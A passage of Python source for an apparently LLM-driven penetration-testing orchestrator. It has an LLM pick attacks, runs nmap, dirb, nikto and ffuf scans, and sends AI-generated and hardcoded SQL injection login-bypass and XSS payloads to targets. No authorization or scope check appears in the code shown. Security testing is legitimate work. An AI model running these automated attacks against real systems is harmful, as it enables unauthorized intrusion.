"""
Hati - Orchestrator (主控 Agent)
增强版：智能攻击面分析 + Skills 遍历 + POC 生成与验证
"""

import os
import sys

# Fix Unicode output on Windows
if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except AttributeError:
        pass  # Celery worker: stdout/stderr is LoggingProxy

import json
import re
import requests
from typing import Dict, Any, Literal, Optional, List
from datetime import datetime
from langgraph.graph import StateGraph, END

from state.pentest_state import (
    PentestState,
    PentestPhase,
    TaskState,
    create_initial_state,
    update_state,
    add_agent_message,
)
from config.minimax_config import get_llm, get_system_prompt
from config.prompts_layered import (
    get_prompt_builder,
    DEFAULT_TODO_LIST,
    RAGFragment,
)
from config.celery_config import celery_app
from security.audit_logger import AuditLogger


# ===========================================
# ReAct Orchestrator (智能攻击版)
# ===========================================
class Orchestrator:
    """
    渗透测试主控 Agent (智能攻击版)

    核心改进：
    1. AI 基于网页内容智能分析攻击面
    2. 遍历所有匹配 Skills，选择最适合的攻击技能
    3. 调用多个 HexStrike MCP 工具进行渗透
    4. 结合 RAG POC 知识生成验证 POC
    5. 实际发送网络请求，分析响应判断攻击是否成功
    """

    def __init__(self, audit_logger: AuditLogger = None):
        self.audit_logger = audit_logger
        self.llm = get_llm()
        self.skill_loader = None
        self.poc_generator = None
        self.hexstrike_client = None
        self.all_skills = []  # 所有可用技能
        self.prompt_builder = get_prompt_builder()  # 分层Prompt构建器

    def _init_components(self):
        """延迟初始化组件"""
        if self.skill_loader is None:
            from agents.skill_loader import get_skill_loader
            self.skill_loader = get_skill_loader()
            self.all_skills = self.skill_loader.list_skills()
            print(f"[Orchestrator] 已加载 {len(self.all_skills)} 个攻击技能")

        if self.poc_generator is None:
            from agents.poc_generator import get_poc_generator
            self.poc_generator = get_poc_generator()

        if self.hexstrike_client is None:
            from agents.recon_agent import HexStrikeClient
            self.hexstrike_client = HexStrikeClient()

    def think(self, state: PentestState) -> Dict[str, Any]:
        """
        Think 阶段：AI 分析当前状态，决定下一步行动

        关键改进：使用分层 Prompt 架构减少 KV-cache 失效
        """
        self._init_components()

        task_id = state["task_id"]
        target = state["target"]
        current_phase = state.get("current_phase", "init")
        user_intent = state.get("user_intent", "")
        page_info = state.get("page_info") or {}
        page_content = state.get("page_content", "")

        # ===========================================
        # 初始化 Todo 列表（如果为空）
        # ===========================================
        todo_list = state.get("todo_list")
        if not todo_list:
            todo_list = DEFAULT_TODO_LIST.copy()
            state = update_state(state, todo_list=todo_list)

        # ===========================================
        # 使用分层 Prompt 构建器
        # ===========================================
        # 构建用户提示
        user_prompt = f"""## 任务信息
目标: {target}
当前阶段: {current_phase}
用户意图: {user_intent}

## 页面分析信息
"""
        if page_info:
            user_prompt += f"""- URL: {page_info.get('url', 'N/A')}
- 标题: {page_info.get('title', 'N/A')}
- 状态码: {page_info.get('status', 'N/A')}
- 是否登录页: {'是' if page_info.get('is_login_page') else '否'}
- 是否SPA: {'是' if page_info.get('is_spa') else '否'}
- 技术栈: {', '.join(page_info.get('tech', [])) or '未知'}
- 检测到的端口: {page_info.get('port', 'N/A')}
"""
        else:
            user_prompt += "- 页面信息: 暂无\n"

        user_prompt += f"""
## 可用攻击技能 ({len(self.all_skills)} 个)
{', '.join(self.all_skills[:20])}...
"""

        # 基于页面内容分析攻击面
        attack_surface_hints = self._analyze_content_for_attack_surfaces(
            target, page_info, page_content, user_intent
        )

        user_prompt += f"""
## AI 攻击面分析（基于页面内容智能推断）
{attack_surface_hints}
"""

        # 已有结果
        vuln_result = state.get("vuln_result") or {}
        vulns = vuln_result.get("vulnerabilities", [])
        user_prompt += f"""
## 当前发现
- 已发现漏洞: {len(vulns)} 个
"""
        for v in vulns[-3:]:
            user_prompt += f"  - {v.get('name', 'unknown')} ({v.get('severity', 'unknown')})\n"

        user_prompt += """
## 决策要求
请决定下一步行动。可选行动：

1. "attack_surfaces_discovery" - 全面攻击面发现（调用多个 MCP 工具）
2. "skill_based_attack" - 基于 Skills 执行特定攻击
3. "rag_poc_attack" - 查询 RAG POC 知识库并生成 POC 攻击
4. "auth_bypass" - 认证绕过测试（弱密码、默认密码）
5. "generate_poc_and_test" - 生成 POC 并实际发送请求验证
6. "complete" - 完成测试

请以 JSON 格式返回：
{
    "action": "行动名称",
    "reasoning": "为什么选择这个行动",
    "attack_vectors": ["攻击向量1", "攻击向量2"],
    "skills_to_use": ["技能1", "技能2"],
    "mcp_tools": ["tool1", "tool2"],
    "poc_template": "POC 模板或参考"
}

重要：
- 如果用户关注弱密码，优先选择 "auth_bypass"
- 如果页面是 SPA，攻击面可能包括 API 接口、JWT Token 等
- 尽量选择多个攻击向量并行测试
"""

        try:
            # 检查用户意图
            user_intent_lower = user_intent.lower()
            has_auth_intent = any(kw in user_intent_lower for kw in ["弱密码", "弱口令", "默认密码", "密码测试", "认证", "登录", "login", "password", "auth"])

            # 检查是否已进行过 auth_bypass
            auth_bypass_done = any(v.get("type") == "auth_test" or v.get("name") == "认证测试完成" for v in vulns)

            if has_auth_intent and not auth_bypass_done:
                print(f"[Orchestrator] 🎯 检测到认证相关测试需求，优先进行认证绕过测试")
                # 更新 Todo：标记"识别目标 web 服务指纹"为完成
                todo_list = self._update_todo(todo_list, "识别目标 web 服务指纹", completed=True)
                state = update_state(state, todo_list=todo_list)
                return {
                    "action": "auth_bypass",
                    "reasoning": f"用户意图：{user_intent}，优先进行认证绕过测试",
                    "attack_vectors": ["weak_password", "default_credentials", "brute_force"],
                    "skills_to_use": ["weak-password", "default-creds"],
                }
            elif has_auth_intent and auth_bypass_done:
                # auth_bypass 已完成，转向 RAG POC 攻击或其他向量
                print(f"[Orchestrator] 🎯 auth_bypass 已完成，转向其他攻击向量")
                return {
                    "action": "rag_poc_attack",
                    "reasoning": "auth_bypass 未发现漏洞，查询 RAG POC 知识库进行其他攻击",
                    "attack_vectors": ["rag_poc", "skill_based"],
                }

            # ===========================================
            # 使用分层 Prompt 构建系统提示
            # ===========================================
            system_prompt = self.prompt_builder.build_system_message(
                phase=current_phase.value if hasattr(current_phase, 'value') else str(current_phase)
            )

            # 调用 LLM
            response = self.llm.chat(
                prompt=user_prompt,
                system_prompt=system_prompt,
            )

            result = self._parse_decision(response)

            # ===========================================
            # 根据决策更新 Todo 列表
            # ===========================================
            action = result.get("action", "")
            if action == "attack_surfaces_discovery":
                todo_list = self._update_todo(todo_list, "扫描开放端口和服务", completed=True)
            elif action == "rag_poc_attack":
                todo_list = self._update_todo(todo_list, "根据指纹检索 RAG 知识库的 POC", completed=True)
            elif action == "complete":
                todo_list = self._mark_all_complete(todo_list)

            state = update_state(state, todo_list=todo_list)

            return result

        except Exception as e:
            print(f"[Orchestrator] LLM 决策失败: {e}")
            return {"action": "complete", "reasoning": "决策失败，默认完成"}

    def _update_todo(self, todo_list: List[str], item: str, completed: bool = True) -> List[str]:
        """更新 Todo 项"""
        prefix = "- [x] " if completed else "- [ ] "
        new_list = []
        found = False

        for existing in todo_list:
            if item in existing and not found:
                # 替换为新状态
                new_list.append(existing.replace("- [ ] ", prefix).replace("- [x] ", prefix))
                found = True
            else:
                new_list.append(existing)

        # 如果没找到匹配的，添加到末尾
        if not found:
            new_list.append(f"{prefix}{item}")

        return new_list

    def _mark_all_complete(self, todo_list: List[str]) -> List[str]:
        """标记所有 Todo 为完成"""
        return [item.replace("- [ ] ", "- [x] ") for item in todo_list]

    def _analyze_content_for_attack_surfaces(
        self, target: str, page_info: Dict, page_content: str, user_intent: str
    ) -> str:
        """
        基于页面内容智能分析可能的攻击面
        """
        analysis = []

        # URL 分析
        url_lower = target.lower()
        if "/login" in url_lower or "/signin" in url_lower:
            analysis.append("【认证相关】检测到登录相关 URL，可能存在弱密码、暴力破解、SQL 注入等")
        if "/admin" in url_lower:
            analysis.append("【管理后台】检测到 admin 路径，可能存在默认凭证、未授权访问")
        if "/api" in url_lower:
            analysis.append("【API 接口】检测到 API 路径，可能存在 API 安全问题")
        if "/reset" in url_lower or "/forgot" in url_lower:
            analysis.append("【密码重置】检测到密码重置功能，可能存在账户接管风险")

        # 技术栈分析
        tech = page_info.get("tech", [])
        for t in tech:
            t_lower = t.lower()
            if "react" in t_lower or "vue" in t_lower or "angular" in t_lower:
                analysis.append(f"【{t} SPA】前端框架，可能存在 XSS、IDOR、前端绕过")
            if "php" in t_lower:
                analysis.append("【PHP 应用】可能存在 SQL 注入、文件上传、远程代码执行")
            if "apache" in t_lower or "nginx" in t_lower:
                analysis.append(f"【Web 服务器】{t}，可能存在配置错误、目录遍历、解析漏洞")

        # 用户意图关联
        intent_lower = user_intent.lower()
        if "弱密码" in user_intent or "弱口令" in user_intent:
            analysis.append("【用户关注】弱密码测试 → 需要尝试常见默认密码组合")
        if "sql" in intent_lower or "注入" in intent_lower:
            analysis.append("【用户关注】SQL 注入 → 需要测试参数化查询、联合查询、布尔盲注")
        if "xss" in intent_lower:
            analysis.append("【用户关注】XSS → 需要测试反射型、存储型、DOM 型 XSS")
        if "api" in intent_lower:
            analysis.append("【用户关注】API 安全 → 需要测试 REST API 端点、参数验证")

        if not analysis:
            analysis.append("【通用】未识别特定攻击面，建议进行综合扫描")

        return "\n".join(analysis)

    def _parse_decision(self, response: str) -> Dict[str, Any]:
        """解析 LLM 决策响应"""
        json_match = re.search(r'\{.*\}', response, re.DOTALL)
        if json_match:
            try:
                return json.loads(json_match.group())
            except json.JSONDecodeError:
                pass

        response_lower = response.lower()
        if "auth_bypass" in response_lower:
            return {"action": "auth_bypass", "reasoning": "认证测试"}
        elif "attack_surfaces" in response_lower:
            return {"action": "attack_surfaces_discovery", "reasoning": "攻击面发现"}
        elif "skill_based" in response_lower:
            return {"action": "skill_based_attack", "reasoning": "基于技能攻击"}
        elif "rag" in response_lower or "poc" in response_lower:
            return {"action": "rag_poc_attack", "reasoning": "RAG POC 攻击"}
        else:
            return {"action": "complete", "reasoning": "完成"}

    def act(self, state: PentestState, decision: Dict[str, Any]) -> PentestState:
        """
        Act 阶段：执行决策
        """
        self._init_components()

        action = decision.get("action", "")
        task_id = state["task_id"]

        from state.progress_tracker import get_progress_tracker
        tracker = get_progress_tracker()

        try:
            if action == "attack_surfaces_discovery":
                # 全面攻击面发现
                tracker.update_phase(task_id, "recon", "攻击面发现",
                                   f"调用多个 MCP 工具进行攻击面发现",
                                   reasoning=decision.get("reasoning", ""))
                state = self._do_attack_surfaces_discovery(state, decision)

            elif action == "skill_based_attack":
                # 基于技能攻击
                skills = decision.get("skills_to_use", [])
                tracker.update_phase(task_id, "vuln_scan", "技能攻击",
                                   f"使用 {len(skills)} 个技能进行攻击",
                                   reasoning=decision.get("reasoning", ""))
                state = self._do_skill_based_attack(state, skills)

            elif action == "rag_poc_attack":
                # RAG POC 攻击
                tracker.update_phase(task_id, "vuln_scan", "POC 攻击",
                                   f"查询 RAG 并生成 POC 进行攻击",
                                   reasoning=decision.get("reasoning", ""))
                state = self._do_rag_poc_attack(state)

            elif action == "rag_poc_attack_auth":
                # RAG POC 认证相关攻击
                tracker.update_phase(task_id, "vuln_scan", "认证POC攻击",
                                   f"查询 RAG 认证相关 POC 进行攻击",
                                   reasoning=decision.get("reasoning", ""))
                state = self._do_rag_poc_attack_auth(state)

            elif action == "auth_bypass":
                # 认证绕过测试
                tracker.update_phase(task_id, "vuln_scan", "认证测试",
                                   f"对 {state['target']} 进行认证绕过测试",
                                   reasoning=decision.get("reasoning", "检测到认证相关需求"))
                state = self._do_auth_bypass_test(state)

            elif action == "generate_poc_and_test":
                # 生成 POC 并测试
                tracker.update_phase(task_id, "vuln_scan", "POC 验证",
                                   f"生成 POC 并实际发送请求验证",
                                   reasoning=decision.get("reasoning", ""))
                state = self._do_generate_and_test_poc(state)

            elif action == "complete":
                from state.pentest_state import advance_phase
                state = advance_phase(state, PentestPhase.COMPLETE)

            return state

        except Exception as e:
            print(f"[Orchestrator] 执行行动失败 {action}: {e}")
            import traceback
            traceback.print_exc()
            return state

    def _do_attack_surfaces_discovery(self, state: PentestState, decision: Dict) -> PentestState:
        """
        全面攻击面发现 - 调用多个 MCP 工具
        """
        target = state["target"]
        page_info = state.get("page_info") or {}

        # 获取目标 URL/IP
        target_url = page_info.get("url", target)
        import re
        url_match = re.search(r'https?://[a-zA-Z0-9.:/-]+', str(target_url))
        clean_url = url_match.group(0) if url_match else target_url

        ip_match = re.search(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', str(target))
        clean_ip = ip_match.group(0) if ip_match else target

        print(f"[Orchestrator] 🔍 开始全面攻击面发现")
        print(f"[Orchestrator] 📡 目标 URL: {clean_url}")
        print(f"[Orchestrator] 📡 目标 IP: {clean_ip}")

        # 调用多个 MCP 工具
        mcp_tools = decision.get("mcp_tools", ["nmap", "dirb", "whatweb", "nikto"])

        findings = []

        for tool in mcp_tools:
            tool = tool.strip().lower()
            print(f"[Orchestrator] 🔧 调用 MCP 工具: {tool}")

            try:
                if "nmap" in tool:
                    result = self.hexstrike_client.execute_command(
                        f"nmap -sV -sC -O {clean_ip}",
                        category="network"
                    )
                    if result.get("success"):
                        stdout = result.get("stdout", "")
                        print(f"[Orchestrator] ✅ nmap 完成，结果长度: {len(stdout)}")
                        findings.append({"type": "nmap", "data": stdout, "tool": "nmap"})

                        # 解析端口
                        port_pattern = r'(\d+)/open'
                        ports = re.findall(port_pattern, stdout)
                        if ports:
                            print(f"[Orchestrator] 📡 发现开放端口: {ports}")

                elif "dirb" in tool or "dir" in tool:
                    result = self.hexstrike_client.execute_command(
                        f"dirb {clean_url}",
                        category="web_security"
                    )
                    if result.get("success"):
                        stdout = result.get("stdout", "")
                        print(f"[Orchestrator] ✅ dirb 完成，发现 {stdout.count('+')} 个目录")
                        findings.append({"type": "directories", "data": stdout, "tool": "dirb"})

                elif "whatweb" in tool:
                    result = self.hexstrike_client.execute_command(
                        f"whatweb {clean_url}",
                        category="web_security"
                    )
                    if result.get("success"):
                        stdout = result.get("stdout", "")
                        print(f"[Orchestrator] ✅ whatweb 完成")
                        findings.append({"type": "fingerprint", "data": stdout, "tool": "whatweb"})

                elif "nikto" in tool:
                    result = self.hexstrike_client.execute_command(
                        f"nikto -h {clean_url}",
                        category="vuln_scanning"
                    )
                    if result.get("success"):
                        stdout = result.get("stdout", "")
                        print(f"[Orchestrator] ✅ nikto 完成")
                        findings.append({"type": "nikto", "data": stdout, "tool": "nikto"})

                elif "scan" in tool or "dir_scan" in tool or "directory" in tool:
                    # 目录扫描
                    result = self.hexstrike_client.execute_command(
                        f"dirb {clean_url}",
                        category="web_security"
                    )
                    if result.get("success"):
                        stdout = result.get("stdout", "")
                        print(f"[Orchestrator] ✅ 目录扫描完成")
                        findings.append({"type": "directories", "data": stdout, "tool": "dirb"})

                elif "api" in tool or "rest" in tool:
                    # API 探测
                    result = self.hexstrike_client.execute_command(
                        f"ffuf -u {clean_url}/FUZZ -w /usr/share/wordlists/common.txt",
                        category="web_security"
                    )
                    if result.get("success"):
                        stdout = result.get("stdout", "")
                        findings.append({"type": "api_endpoints", "data": stdout, "tool": "ffuf"})

                else:
                    # 未知工具，使用默认的 nmap 扫描
                    print(f"[Orchestrator] ⚠️ 未知工具 {tool}，执行默认端口扫描")
                    result = self.hexstrike_client.execute_command(
                        f"nmap -sV -sC {clean_ip}",
                        category="network"
                    )
                    if result.get("success"):
                        stdout = result.get("stdout", "")
                        findings.append({"type": "nmap", "data": stdout, "tool": "nmap"})

            except Exception as e:
                print(f"[Orchestrator] ⚠️ 工具 {tool} 执行失败: {e}")

        # 更新状态
        attack_surface = state.get("attack_surface", [])
        for f in findings:
            attack_surface.append({
                "type": f["type"],
                "data": f["data"],
                "tool": f.get("tool", "unknown"),
                "source": "mcp_discovery"
            })
        state["attack_surface"] = attack_surface

        # 推进阶段
        from state.pentest_state import advance_phase
        if state["current_phase"] == PentestPhase.INIT:
            state = advance_phase(state, PentestPhase.RECON)

        return state

    def _do_skill_based_attack(self, state: PentestState, skills: List[str]) -> PentestState:
        """
        基于 Skills 执行攻击 — 使用 LLM 阅读技能全文，生成针对性命令并执行

        不再使用硬编码 payload，而是将完整的 SKILL.md 内容喂给 LLM，
        让 LLM 基于真实的攻击知识生成适合当前目标的具体命令。
        """
        target = state["target"]
        page_info = state.get("page_info") or {}
        target_url = page_info.get("url", target)

        findings = state.get("findings", [])
        print(f"[Orchestrator] 🎯 开始基于 {len(skills)} 个技能的 LLM 驱动攻击")

        for skill_name in skills:
            skill_name = skill_name.strip()
            if not skill_name:
                continue

            print(f"[Orchestrator] 📜 执行技能: {skill_name}")

            # 获取技能完整内容
            skill_content = self.skill_loader.get_skill_content(skill_name)
            if not skill_content:
                print(f"[Orchestrator] ⚠️ 技能 {skill_name} 内容为空，跳过")
                continue

            # 使用 LLM 从技能内容中提取 HTTP POC 请求（适配到目标）
            try:
                poc_requests = _llm_adapt_skill_to_target(
                    self.llm, skill_name, skill_content, target, state
                )
            except Exception as e:
                print(f"[Orchestrator] ⚠️ LLM POC 提取失败 ({skill_name}): {e}")
                continue

            if not poc_requests:
                print(f"[Orchestrator] ⚠️ 技能 {skill_name} 未生成可执行 POC，跳过")
                continue

            import requests as _req
            import urllib3 as _urllib3
            _urllib3.disable_warnings()

            for poc in poc_requests:
                method = poc.get("method", "GET").upper()
                path = poc.get("path", "/")
                headers = poc.get("headers", {}) or {}
                body = poc.get("body", "")
                vulnerability = poc.get("vulnerability", skill_name)
                indicator = poc.get("success_indicator", "")

                # 构造完整 URL
                full_url = path if path.startswith("http") else f"{target.rstrip('/')}/{path.lstrip('/')}"
                print(f"[Orchestrator] ⚡ POC: {method} {full_url[:120]}")

                try:
                    if method == "GET":
                        resp = _req.get(full_url, headers=headers, timeout=15, verify=False, allow_redirects=True)
                    else:
                        resp = _req.post(full_url, headers=headers, data=body, timeout=15, verify=False, allow_redirects=True)

                    # 验证漏洞是否存在
                    vuln_confirmed = False
                    if indicator:
                        vuln_confirmed = indicator.lower() in resp.text.lower()

                    findings.append({
                        "type": "skill_poc",
                        "skill": skill_name,
                        "vulnerability": vulnerability,
                        "method": method,
                        "url": full_url,
                        "status_code": resp.status_code,
                        "vuln_confirmed": vuln_confirmed,
                        "indicator": indicator[:100],
                        "response_preview": resp.text[:500],
                        "success": True,
                    })
                    status = "漏洞确认!" if vuln_confirmed else "未确认漏洞"
                    print(f"[Orchestrator] {'✅' if vuln_confirmed else '🔍'} 技能 {skill_name} {method} {full_url} → {resp.status_code} [{status}]")
                except Exception as e:
                    findings.append({
                        "type": "skill_poc",
                        "skill": skill_name,
                        "vulnerability": vulnerability,
                        "method": method,
                        "url": full_url,
                        "error": str(e),
                        "success": False,
                    })
                    print(f"[Orchestrator] ❌ 技能 {skill_name} POC 请求失败: {e}")

        state["findings"] = findings
        return state


    def _do_rag_poc_attack(self, state: PentestState) -> PentestState:
        """
        RAG POC 攻击 - 查询 RAG 知识库获取 POC 并执行
        """
        from rag.query_interface import get_rag_interface

        target = state["target"]
        page_info = state.get("page_info") or {}
        tech = page_info.get("tech", [])

        print(f"[Orchestrator] 🔍 查询 RAG 知识库")

        try:
            rag = get_rag_interface()

            # 查询相关 POC
            query_text = f"{target} {' '.join(tech)} vulnerability exploit"
            result = rag.query(query_text, n_results=5, sources=["poc"])

            print(f"[Orchestrator] 📡 RAG 返回 {result.total_count} 个 POC")

            if result.total_count == 0:
                # 没有 POC，生成通用 POC
                return self._do_generate_and_test_poc(state)

            # 对每个 POC 执行测试
            for vuln in result.vulnerabilities:
                print(f"[Orchestrator] 📜 测试 POC: {vuln.name} (来源: {vuln.source})")

                # 如果有 POC 内容，使用它
                if hasattr(vuln, 'poc_content') and vuln.poc_content:
                    poc_code = vuln.poc_content
                    self._execute_poc_code(state, poc_code, vuln)
                else:
                    # 否则生成 POC
                    self._generate_and_test_poc_from_vuln(state, vuln)

        except Exception as e:
            print(f"[Orchestrator] ⚠️ RAG 查询失败: {e}")
            # 回退到生成 POC
            return self._do_generate_and_test_poc(state)

        return state

    def _do_rag_poc_attack_auth(self, state: PentestState) -> PentestState:
        """
        RAG POC 认证相关攻击 - 查询认证相关的 POC 并执行
        """
        from rag.query_interface import get_rag_interface

        target = state["target"]
        page_info = state.get("page_info") or {}

        print(f"[Orchestrator] 🔍 查询 RAG 知识库（认证相关）")

        try:
            rag = get_rag_interface()

            # 查询认证相关的 POC
            query_text = f"login authentication jwt token bypass auth sqli {target}"
            result = rag.query(query_text, n_results=10, sources=["poc"])

            print(f"[Orchestrator] 📡 RAG 返回 {result.total_count} 个认证相关 POC")

            if result.total_count == 0:
                print(f"[Orchestrator] ⚠️ 没有找到认证相关的 POC")
                return state

            # 对每个 POC 执行测试
            for vuln in result.vulnerabilities:
                print(f"[Orchestrator] 📜 测试认证 POC: {vuln.name} (来源: {vuln.source})")

                if hasattr(vuln, 'poc_content') and vuln.poc_content:
                    poc_code = vuln.poc_content
                    self._execute_poc_code(state, poc_code, vuln)
                else:
                    self._generate_and_test_poc_from_vuln(state, vuln)

        except Exception as e:
            print(f"[Orchestrator] ⚠️ RAG 认证 POC 查询失败: {e}")

        return state

    def _generate_and_test_poc_from_vuln(self, state: PentestState, vuln):
        """基于 RAG 漏洞信息生成并测试 POC"""
        target = state["target"]
        page_info = state.get("page_info") or {}

        # 构建 POC 请求
        from agents.poc_generator import POCRequest

        request = POCRequest(
            target=target,
            vulnerability_name=vuln.name,
            cve_id=vuln.cve_id,
            tech_stack=page_info.get("tech", []),
        )

        # 生成 POC
        poc_result = self.poc_generator.generate_poc(request)

        print(f"[Orchestrator] 📜 生成 POC (风险: {poc_result.risk_level})")
        print(f"[Orchestrator] 📜 说明: {poc_result.explanation}")

        # 执行 POC
        self._execute_poc_code(state, poc_result.poc_code, vuln)

    def _execute_poc_code(self, state: PentestState, poc_code: str, vuln_info):
        """执行 POC 代码并分析结果 - AI驱动的动态攻击"""
        target = state["target"]
        page_info = state.get("page_info") or {}
        is_spa = page_info.get("is_spa", False)
        task_id = state["task_id"]

        from state.progress_tracker import get_progress_tracker
        tracker = get_progress_tracker()

        print(f"[Orchestrator] ⚡ AI驱动的 POC 验证...")

        # 解析漏洞信息
        vuln_type = self._detect_vuln_type(vuln_info)
        vuln_name = vuln_info.name if hasattr(vuln_info, 'name') else str(vuln_info)
        vuln_description = vuln_info.description if hasattr(vuln_info, 'description') else str(vuln_info)

        print(f"[Orchestrator] 🎯 POC类型: {vuln_type}, 名称: {vuln_name}")

        # 构建AI攻击决策提示 - 让AI动态决定如何攻击
        attack_prompt = f"""你是渗透测试专家，基于以下信息动态生成攻击命令。

## 目标信息
- 目标URL: {target}
- 是否SPA: {'是' if is_spa else '否'}
- 技术栈: {', '.join(page_info.get('tech', [])) or '未知'}
- 页面标题: {page_info.get('title', '未知')}

## 漏洞信息
- 漏洞名称: {vuln_name}
- 漏洞类型: {vuln_type}
- 漏洞描述: {vuln_description[:500]}

## POC内容
{poc_code[:1000] if poc_code else '无'}

## 你的任务
1. 分析目标页面特征
2. 根据漏洞类型动态生成攻击payload
3. 生成实际可执行的curl命令或HTTP请求
4. 考虑目标可能的技术栈（React SPA、API接口等）

请以JSON格式返回攻击命令：
{{
    "attack_type": "sqli/xss/rce/lfi/etc",
    "target_endpoint": "实际攻击的URL端点",
    "http_method": "POST/GET",
    "headers": {{"Content-Type": "application/json"}},
    "body": {{"field": "payload"}},
    "payload": "实际使用的payload",
    "success_indicator": "如何判断攻击成功（如：响应中的特征字符串）",
    "reasoning": "为什么这样构造payload"
}}

重要：
- payload必须针对这个具体目标动态生成，不能用通用固定值
- 考虑SPA的特点，API端点可能在 /api/auth/login 等
- 构造的请求必须实际可执行
"""

        try:
            # 调用AI生成动态攻击
            ai_response = self.llm.chat(
                prompt=attack_prompt,
                system_prompt="你是一个专业的渗透测试工具，擅长生成针对特定目标的动态攻击命令。",
            )

            # 解析AI响应
            import re
            json_match = re.search(r'\{.*\}', ai_response, re.DOTALL)
            if json_match:
                attack_plan = json.loads(json_match.group())
            else:
                # 如果解析失败，使用基础攻击
                attack_plan = self._get_fallback_attack_plan(target, vuln_type, is_spa)

            # 记录AI生成的攻击计划
            tracker.update_phase(
                task_id, "vuln_scan",
                f"🤖 AI生成{vuln_type}攻击",
                f"🔧 攻击类型: {attack_plan.get('attack_type')} | 🎯 目标: {attack_plan.get('target_endpoint')} | 💉 Payload: {attack_plan.get('payload', 'N/A')[:50]}",
                reasoning=attack_plan.get('reasoning', ''),
                tool=f"AI驱动的{vuln_type}攻击",
                command=attack_plan.get('payload', '')[:100]
            )

            # 执行AI生成的攻击
            self._execute_ai_attack(state, attack_plan, tracker, task_id)

        except Exception as e:
            print(f"[Orchestrator] ⚠️ AI驱动攻击执行失败: {e}")
            # 回退到基础攻击
            self._execute_fallback_attack(state, vuln_type, target, is_spa, tracker, task_id)

    def _execute_ai_attack(self, state: PentestState, attack_plan: Dict, tracker, task_id: str):
        """执行AI生成的攻击"""
        import requests

        target_endpoint = attack_plan.get('target_endpoint', state['target'])
        method = attack_plan.get('http_method', 'POST').upper()
        headers = attack_plan.get('headers', {'Content-Type': 'application/json'})
        body = attack_plan.get('body', {})
        payload = attack_plan.get('payload', '')
        success_indicator = attack_plan.get('success_indicator', '')

        print(f"[Orchestrator] 🔧 执行AI攻击: {method} {target_endpoint}")
        print(f"[Orchestrator] 💉 Payload: {payload[:80]}...")

        try:
            if method == 'POST':
                resp = requests.post(
                    target_endpoint,
                    json=body,
                    headers=headers,
                    timeout=10,
                    verify=False,
                    allow_redirects=False
                )
            else:
                resp = requests.get(
                    target_endpoint,
                    params=body,
                    headers=headers,
                    timeout=10,
                    verify=False,
                    allow_redirects=False
                )

            resp_text = resp.text
            resp_lower = resp_text.lower()

            # 检测成功特征
            success = False
            if success_indicator and success_indicator.lower() in resp_lower:
                success = True
            elif any(err in resp_lower for err in ['sql', 'syntax', 'error', 'mysql', 'postgresql', 'ora-', 'sqlite']):
                success = True
                tracker.update_phase(
                    task_id, "vuln_scan",
                    f"🚨 {attack_plan.get('attack_type')}漏洞发现!",
                    f"✅ 漏洞类型: {attack_plan.get('attack_type')} | 🔴 严重性: critical | 💉 Payload: {payload[:50]} | 📍 端点: {target_endpoint} | 🔍 响应包含SQL错误",
                    reasoning=f"payload '{payload}' 触发了SQL错误特征",
                    tool=f"AI驱动的{attack_plan.get('attack_type')}攻击",
                    command=payload[:100]
                )
            elif resp.status_code == 200 and any(ind in resp_lower for ind in ['dashboard', 'admin', 'welcome', 'profile', 'token', 'jwt']):
                success = True
                tracker.update_phase(
                    task_id, "vuln_scan",
                    f"🚨 {attack_plan.get('attack_type')}攻击成功!",
                    f"✅ 漏洞类型: {attack_plan.get('attack_type')} | 🔴 严重性: critical | 💉 Payload: {payload[:50]} | 📍 端点: {target_endpoint} | 🔍 响应包含管理特征",
                    reasoning=f"payload '{payload}' 导致返回管理界面",
                    tool=f"AI驱动的{attack_plan.get('attack_type')}攻击",
                    command=payload[:100]
                )

            if success:
                self._record_vuln(state, None, f"{attack_plan.get('attack_type')}漏洞", "critical",
                                f"端点: {target_endpoint}, payload: {payload}")
            else:
                tracker.update_phase(
                    task_id, "vuln_scan",
                    f"⚠️ {attack_plan.get('attack_type')}攻击未成功",
                    f"❌ Payload: {payload[:50]} | 📍 端点: {target_endpoint}",
                    reasoning=f"payload未触发成功特征",
                    tool=f"AI驱动的{attack_plan.get('attack_type')}攻击",
                    command=payload[:100]
                )

        except Exception as e:
            tracker.update_phase(
                task_id, "vuln_scan",
                f"⚠️ {attack_plan.get('attack_type')}攻击失败",
                f"❌ 错误: {str(e)[:100]}",
                reasoning=str(e),
                tool=f"AI驱动的{attack_plan.get('attack_type')}攻击",
                command=payload[:100]
            )

    def _get_fallback_attack_plan(self, target: str, vuln_type: str, is_spa: bool) -> Dict:
        """获取回退攻击计划 - 当AI生成失败时使用"""
        base_url = target.split('?')[0].rstrip('/')

        if 'login' in target.lower() or vuln_type in ['sqli', 'sql']:
            return {
                "attack_type": "sqli",
                "target_endpoint": f"{base_url}/api/auth/login",
                "http_method": "POST",
                "headers": {"Content-Type": "application/json"},
                "body": {"username": "' OR '1'='1", "password": "anything"},
                "payload": "' OR '1'='1",
                "success_indicator": "sql",
                "reasoning": "检测到登录端点，使用基础SQL注入测试"
            }
        elif vuln_type in ['xss']:
            return {
                "attack_type": "xss",
                "target_endpoint": f"{base_url}/api/search",
                "http_method": "GET",
                "headers": {},
                "body": {"q": "<script>alert('XSS')</script>"},
                "payload": "<script>alert('XSS')</script>",
                "success_indicator": "<script>",
                "reasoning": "检测到搜索端点，使用基础XSS测试"
            }
        else:
            return {
                "attack_type": vuln_type,
                "target_endpoint": target,
                "http_method": "POST",
                "headers": {"Content-Type": "application/json"},
                "body": {"input": "test"},
                "payload": "test",
                "success_indicator": "",
                "reasoning": "使用通用测试"
            }

    def _execute_fallback_attack(self, state: PentestState, vuln_type: str, target: str, is_spa: bool, tracker, task_id: str):
        """执行回退攻击 - 基础攻击"""
        import requests

        base_url = target.split('?')[0].rstrip('/')
        tracker.update_phase(
            task_id, "vuln_scan",
            f"⚡ 执行基础{vuln_type}攻击",
            f"🎯 目标: {base_url}",
            reasoning="AI生成失败，使用基础攻击策略",
            tool=f"基础{vuln_type}攻击",
            command=""
        )

        # 基础SQL注入测试
        if vuln_type in ['sqli', 'sql', 'auth_bypass', 'authentication', 'login']:
            test_urls = [
                f"{base_url}/api/auth/login",
                f"{base_url}/api/login",
                f"{base_url}/login",
            ]

            payloads = ["' OR '1'='1", "' OR 1=1--", "admin'--"]

            for url in test_urls:
                for payload in payloads:
                    try:
                        resp = requests.post(
                            url,
                            json={"username": payload, "password": payload},
                            timeout=10,
                            verify=False
                        )
